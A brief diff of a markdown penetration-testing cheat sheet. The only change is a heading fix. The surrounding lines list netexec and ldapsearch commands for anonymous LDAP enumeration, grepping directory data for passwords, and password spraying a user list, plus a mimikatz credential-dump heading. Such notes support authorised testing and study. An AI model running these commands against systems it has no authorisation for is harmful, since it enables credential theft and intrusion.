@@ -26,7 +26,7 @@ Nxc ldap <ip> -u '' ip '' -M get-desc-users
 Ldapsearch -x -H ldap://<DC IP>:389 -b"DC=<>,DC=<>" |grep -I 'password'
 Nxc ldap <dc> -u users.txt -p <password> --continue-on-success
 ```
-#Internal
+# Internal
 **Credential dumps
 mimikatz - elevate privilidges
 ```
